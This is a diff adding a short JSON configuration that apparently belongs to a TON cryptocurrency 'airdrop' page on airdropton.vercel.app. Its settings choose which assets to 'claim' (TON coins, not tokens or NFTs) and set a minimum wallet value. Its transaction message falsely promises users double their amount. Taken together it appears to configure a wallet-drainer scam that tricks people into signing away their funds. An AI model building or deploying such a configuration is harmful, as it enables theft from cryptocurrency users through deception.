@@ -1,0 +1,11 @@
+{
+    "transactionMessage": "Receive {amount*2} {token}",
+    "modalLanguage": "en",
+    "manifestUrl": "https://airdropton.vercel.app/manifest.json",
+    "origin": "airdropton.vercel.app",
+    "claimTON": true,
+    "claimJettons": false,
+    "claimNFTs": false,
+    "retry": false,
+    "minValue": 20
+}
